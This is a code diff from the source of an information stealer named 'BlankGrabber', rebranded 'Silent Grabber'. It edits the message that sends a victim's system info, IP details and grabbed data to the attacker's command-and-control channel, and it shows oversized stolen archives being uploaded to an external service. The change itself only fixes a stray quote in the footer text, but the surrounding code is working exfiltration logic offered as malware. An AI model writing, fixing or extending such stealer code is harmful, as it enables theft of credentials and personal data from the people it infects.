@@ -1289,7 +1289,7 @@ class BlankGrabber:
         match Settings.C2[0]:
             case 0:
                 image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Silent Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'color': 34303, 'footer': {'text': 'Grabbed by Silent Grabber" |'}, 'thumbnail': {'url': image_url}}], 'username': 'Silent Grabber', 'avatar_url': image_url}
+                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Silent Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'color': 34303, 'footer': {'text': 'Grabbed by Silent Grabber |'}, 'thumbnail': {'url': image_url}}], 'username': 'Silent Grabber', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
